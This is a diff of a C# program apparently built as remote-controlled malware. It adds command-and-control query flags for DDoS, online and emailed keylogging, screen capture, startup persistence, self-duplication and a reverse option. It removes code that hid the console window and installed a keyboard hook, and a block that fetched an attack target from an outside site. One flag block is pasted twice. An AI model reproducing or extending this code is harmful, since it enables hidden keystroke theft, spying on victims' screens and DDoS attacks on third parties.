@@ -31,24 +31,7 @@ namespace Karios
 
         public static void Main()
         {
-            CommandGet();
-            var handle = GetConsoleWindow();
-           
-
-            // Hide the window
-            ShowWindow(handle, SW_HIDE);
-
-             // Persitance feature
-             //Duplicate(); 
-
-             // Run on startup 
-             //SetStartup();
-             // Start Application
-             _hookID = SetHook(_proc);
-             Application.Run();  
-             UnhookWindowsHookEx(_hookID);
-     
-            
+            CommandGet();            
         }
 
 
@@ -97,11 +80,57 @@ namespace Karios
                             else
                                 paramaters = paramaters + "&newclient=false";
                         }
-
+                        // 1 = DDOSOnline
+                        if (paramaters == "?")
+                            paramaters = paramaters + "ddosonline=true";
+                        else
+                            paramaters = paramaters + "&ddosonline=true";
+                        // 2 = DDOSIP
                         if (paramaters == "?")
                             paramaters = paramaters + "ddosip=true";
                         else
                             paramaters = paramaters + "&ddosip=true";
+                        // 3 = KeyloggerOnline
+                        if (paramaters == "?")
+                            paramaters = paramaters + "keyonline=true";
+                        else
+                            paramaters = paramaters + "&keyonline=true";
+
+                        // 3 = KeyloggerOnline
+                        if (paramaters == "?")
+                            paramaters = paramaters + "keyonline=true";
+                        else
+                            paramaters = paramaters + "&keyonline=true";
+
+                        // 4 = KeyloggerEmail
+                        if (paramaters == "?")
+                            paramaters = paramaters + "keyloggeremail=true";
+                        else
+                            paramaters = paramaters + "&keyloggeremail=true";
+
+                        // 5 = CaptureSceen
+                        if (paramaters == "?")
+                            paramaters = paramaters + "capturescreen=true";
+                        else
+                            paramaters = paramaters + "&capturescreen=true";
+
+                        // 6 = Startup
+                        if (paramaters == "?")
+                            paramaters = paramaters + "startup=true";
+                        else
+                            paramaters = paramaters + "&startup=true";
+
+                        // 7 = Duplication
+                        if (paramaters == "?")
+                            paramaters = paramaters + "duplication=true";
+                        else
+                            paramaters = paramaters + "&duplication=true";
+
+                        // 8 = Reverse
+                        if (paramaters == "?")
+                            paramaters = paramaters + "reverse=false";
+                        else
+                            paramaters = paramaters + "&reverse=false";
 
                         string commands = "";
                         try
@@ -145,7 +174,6 @@ namespace Karios
                             Application.Run();
                             UnhookWindowsHookEx(_hookID);
                         }
-
                     }
                 }
             }
@@ -288,16 +316,9 @@ namespace Karios
             {
                 try
                 {
-                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
-                    if (!webData.ToUpperInvariant().Contains("Website:"))
-                    {   
-                        //this is broken (The search gets everything next to the Website:)
-                        string search = "qwertyuiopasdfghjklzxcvbnmqwe";
-                        string Website = webData.Substring(webData.IndexOf(search) + search.Length);
-                        Website = Website.Replace(@"</p>", "");
-                        // IPTarget = IP on cutenesss.xyz/SteamerTest.html
-                        //Process.Start(Website);
-                    }
+
+                 //Process.Start(Website);
+                    
                 }
                 catch { }
             }
